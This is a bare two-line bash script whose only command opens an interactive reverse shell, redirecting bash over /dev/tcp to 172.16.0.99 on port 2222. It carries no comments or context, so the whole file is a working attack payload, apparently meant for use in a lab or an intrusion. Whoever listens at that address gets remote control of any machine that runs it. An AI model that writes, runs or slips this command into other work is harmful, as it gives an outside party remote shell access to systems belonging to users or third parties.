#!/bin/bash
bash -i >& /dev/tcp/172.16.0.99/2222 0>&1
